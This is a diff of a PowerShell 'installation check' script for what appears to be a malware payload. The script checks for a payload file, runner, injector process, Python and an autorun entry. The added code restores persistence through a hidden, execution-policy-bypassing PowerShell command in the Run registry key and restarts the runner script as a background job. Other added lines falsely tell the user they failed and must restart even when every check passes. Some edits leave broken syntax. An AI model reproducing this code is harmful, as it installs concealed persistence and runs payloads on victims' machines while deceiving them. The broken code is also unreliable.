@@ -41,14 +41,13 @@ function sLog {
 }
 
 function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -e $e }
-function lAct { param($m, $e = @{}) sLog -t "actions" -m $m -e $e }
 function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -e $e }
 
 function tFile {
     param([string]$p, [string]$n)
     if (Test-Path $p) {
         $s = (Get-Item $p).Length
-        lAct "$n exists" @{ path = $p; size = $s }
+        lInfo "$n exists" @{ path = $p; size = $s }
         return $true
     } else {
         lErr "$n missing" @{ expectedPath = $p }
@@ -65,7 +64,7 @@ function tProc {
         foreach ($p in $pr) {
             $pi += @{ pid = $p.Id; startTime = $p.StartTime.ToString("o") }
         }
-        lAct "$pn process running" @{ count = $c; processes = $pi }
+        lInfo "$pn process running" @{ count = $c; processes = $pi }
         return $true
     } else {
         lErr "$pn process not found"
@@ -79,11 +78,54 @@ function tRun {
     try {
         $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
         if ($v.$n) {
-            lAct "Autorun configured" @{ name = $n; command = $v.$n }
+            lInfo "Autorun configured" @{ name = $n; command = $v.$n }
             return $true
         }
     } catch {
         lErr "Autorun missing" @{ expectedName = $n }
+        return $false
+    }
+}
+
+function fixRun {
+    param([string]$n, [string]$rf)
+    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    try {
+        $cmd = "powershell -w h -ep bypass -f `"$rf`""
+        Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
+        lInfo "Autorun fixed" @{ name = $n; command = $cmd }
+        Write-Host "  [✓] Autorun restored" -ForegroundColor Green
+        return $true
+    } catch {
+        lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
+        
+        return $false
+    }
+}
+
+function startRun {
+    param([string]$rf)
+    if (!(Test-Path $rf)) {
+        lErr "Runner file not found, cannot start"
+        
+        return $false
+    }
+    
+    try {
+        $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
+        $scriptBlock = [ScriptBlock]::Create($scriptContent)
+        
+        Start-Job -ScriptBlock $scriptBlock | Out-Null
+        
+        lInfo "Runner started manually" @{ path = $rf }
+        
+        
+        Start-Sleep -Seconds 2
+        
+        return $true
+    } catch {
+        lErr "Failed to start runner" @{ error = $_.Exception.Message }
+        Write-Host "  [✗] Failed to start injector" -ForegroundColor Red
         return $false
     }
 }
@@ -94,7 +136,7 @@ function tPy {
     foreach ($v in $vs) {
         $pp = "$env:LOCALAPPDATA\Programs\Python\Python$v\pythonw.exe"
         if (Test-Path $pp) {
-            lAct "Python installed" @{ version = $v; path = $pp }
+            lInfo "Python installed" @{ version = $v; path = $pp }
             $f = $true
             break
         }
@@ -109,7 +151,7 @@ function tPy {
 function chk {
     Clear-Host
     Write-Host ""
-    Write-Host "  Processing verification..." -ForegroundColor Cyan
+    Write-Host "  Processing checking..." -ForegroundColor Cyan
     Write-Host ""
     
     lInfo "Installation check started" @{
@@ -127,7 +169,7 @@ function chk {
         ar = $false
     }
     
-    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
+    Write-Host "  [*] Checking components..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
     $r.pf = tFile -p $pFile -n "Payload file"
@@ -138,7 +180,32 @@ function chk {
     $r.ar = tRun -n $aName
     
     Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
-    Start-Sleep -Milliseconds 800
+    Start-Sleep -Milliseconds 500
+    
+    $needsRepair = $false
+    
+    if (-not $r.ar -and $r.rf) {
+        Write-Host ""
+        
+        $r.ar = fixRun -n $aName -rf $rFile
+        $needsRepair = $true
+    }
+    
+    if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
+        Write-Host ""
+        
+        if (startRun -rf $rFile) {
+            Start-Sleep -Seconds 3
+            $r.pr = tProc -pn $pName
+        }
+        $needsRepair = $true
+    }
+    
+    if ($needsRepair) {
+        Write-Host ""
+        Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
+        Start-Sleep -Milliseconds 500
+    }
     
     $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
     $tc = $r.Count
@@ -149,30 +216,32 @@ function chk {
     Write-Host ""
     
     if ($pc -eq $tc) {
-        Write-Host "  [✓] Verification complete: $pc/$tc ($pp%)" -ForegroundColor Green
-        lAct "Installation check completed" @{
+        Write-Host "  [!] You did not pass the checking! Restart your computer.: $pc/$tc ($pp%)" -ForegroundColor Red
+        lInfo "Installation check completed" @{
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $true
+            repaired = $needsRepair
         }
     } elseif ($pc -ge 4) {
-        Write-Host "  [!] Verification complete: $pc/$tc ($pp%)" -ForegroundColor Yellow
-        Write-Host "  [!] Restart required for full functionality" -ForegroundColor Yellow
-        lInfo "Installation check completed with warnings" @{
+        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
+        Write-Host ""
+        
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $false
+            repaired = $needsRepair
         }
     } else {
-        Write-Host "  [✗] Verification failed: $pc/$tc ($pp%)" -ForegroundColor Red
-        Write-Host "  [!] Please reinstall" -ForegroundColor Red
-        lErr "Installation check failed" @{
+        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
+        Write-Host ""
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $false
+            repaired = $needsRepair
         }
     }
     
